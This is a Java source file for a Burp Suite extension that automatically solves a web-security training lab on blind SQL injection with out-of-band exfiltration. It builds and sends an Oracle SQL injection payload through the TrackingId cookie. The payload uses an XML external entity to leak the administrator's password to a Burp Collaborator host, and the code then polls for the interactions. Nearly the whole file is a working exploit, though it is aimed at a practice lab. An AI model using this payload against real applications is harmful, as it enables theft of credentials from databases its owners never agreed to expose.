package labSolver;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import labSolver.poller.Poller;

import java.time.Duration;

import java.io.IOException;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.URI;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;


public class LabSolver implements BurpExtension {
    private MontoyaApi api;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;

        api.extension().setName("Lab: Blind SQL injection with out-of-band data exfiltration");

        CollaboratorClient collaboratorClient = createCollaboratorClient();
        String payload = collaboratorClient.generatePayload().toString();

        InteractionLogger interactionLogger = new InteractionLogger(api);

        sendRequest(payload);

        Poller collaboratorPoller = new Poller(collaboratorClient, Duration.ofSeconds(10));
        collaboratorPoller.registerInteractionHandler(new MyInteractionHandler(api, interactionLogger));
        collaboratorPoller.start();

        api.extension().registerUnloadingHandler(() -> {
            collaboratorPoller.shutdown();

            api.logging().logToOutput("Extension unloading...");
        });
    }

    private CollaboratorClient createCollaboratorClient() {
        CollaboratorClient collaboratorClient;

        collaboratorClient = api.collaborator().createClient();

        return collaboratorClient;
    }

    private void sendRequest(String payload) {
        HttpClient client = HttpClient.newHttpClient();
        String encodedPayload = URLEncoder.encode("hacker' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT password FROM users WHERE username = 'administrator')||'." + payload + "/\"> %remote;]>'),'/l') FROM dual--", StandardCharsets.UTF_8);
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create("https://0ab3007f04c68b68848ba04100e10057.web-security-academy.net/"))
                .header("Cookie", "TrackingId=" + encodedPayload)
                .build();

        try {
            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            System.out.println(response.body());
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
